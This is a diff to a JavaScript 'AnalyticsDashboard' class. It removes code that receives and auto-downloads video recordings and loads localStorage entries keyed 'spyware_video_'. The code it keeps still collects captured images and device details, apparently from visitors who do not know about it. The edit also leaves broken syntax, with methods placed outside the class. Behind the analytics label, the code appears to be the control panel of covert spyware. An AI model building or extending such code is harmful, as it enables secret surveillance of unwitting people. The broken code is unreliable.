@@ -136,11 +136,6 @@ class AnalyticsDashboard {
             console.log('Captured image added to dashboard:', imageData.timestamp);
         }
 
-        // Handle video recordings
-        if (data.type === 'VIDEO_RECORDING') {
-            this.handleVideoRecording(data);
-        }
-
         // Handle stats documents
         if (data.type === 'STATS_DOCUMENT') {
             this.handleStatsDocument(data);
@@ -408,31 +403,6 @@ class AnalyticsDashboard {
         }
     }
 
-    handleVideoRecording(data) {
-        // Store video data for dashboard viewing
-        if (!this.videoRecordings) this.videoRecordings = [];
-        
-        this.videoRecordings.push({
-            sessionId: data.sessionId,
-            videoData: data.videoData,
-            fileName: data.fileName,
-            timestamp: data.timestamp,
-            duration: data.duration
-        });
-        
-        // Add to live feed
-        this.addToLiveFeed({
-            type: 'video',
-            message: `Video recording completed for ${data.sessionId}`,
-            timestamp: new Date().toISOString()
-        });
-        
-        // Auto-download video to dashboard device
-        this.downloadVideo(data.videoData, data.fileName);
-        
-        console.log('Video recording processed:', data.fileName);
-    }
-
     handleStatsDocument(data) {
         // Store document data
         if (!this.statsDocuments) this.statsDocuments = [];
@@ -457,28 +427,6 @@ class AnalyticsDashboard {
         console.log('Stats document processed:', data.fileName);
     }
 
-    downloadVideo(videoData, fileName) {
-        // Convert base64 to blob and download
-        const byteCharacters = atob(videoData.split(',')[1]);
-        const byteNumbers = new Array(byteCharacters.length);
-        for (let i = 0; i < byteCharacters.length; i++) {
-            byteNumbers[i] = byteCharacters.charCodeAt(i);
-        }
-        const byteArray = new Uint8Array(byteNumbers);
-        const blob = new Blob([byteArray], { type: 'video/webm' });
-        
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = fileName;
-        
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        
-        setTimeout(() => URL.revokeObjectURL(url), 1000);
-    }
-
     downloadDocument(documentContent, fileName) {
         const blob = new Blob([documentContent], { type: 'application/msword' });
         const url = URL.createObjectURL(blob);
@@ -499,31 +447,15 @@ class AnalyticsDashboard {
         if (stored) {
             try {
                 const data = JSON.parse(stored);
-                this.visitors = data.visitors || [];
+                this.visitors = new Map(data.visitors || []);
                 this.capturedImages = data.capturedImages || [];
-                this.videoRecordings = data.videoRecordings || [];
                 this.statsDocuments = data.statsDocuments || [];
-                this.updateDashboard();
+                this.updateUI();
             } catch (e) {
                 console.error('Error loading stored data:', e);
             }
-        }
-        
-        // Load separate video files from localStorage
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            if (key && key.startsWith('spyware_video_')) {
-                try {
-                    const videoData = JSON.parse(localStorage.getItem(key));
-                    this.handleVideoRecording(videoData);
-                    console.log('Loaded video from separate storage:', key);
-                } catch (error) {
-                    console.error('Error loading video data:', error);
-                }
-            }
-        }
     }
-}
+};
 
 getDeviceInfo() {
     const ua = navigator.userAgent;
@@ -538,12 +470,12 @@ getDeviceInfo() {
         browser,
         os: navigator.platform,
         mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)
-    };
-}
+    };  
+};
 
 generateSessionId() {
     return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
-}
+};
 
 // Initialize dashboard
 const dashboard = new AnalyticsDashboard();
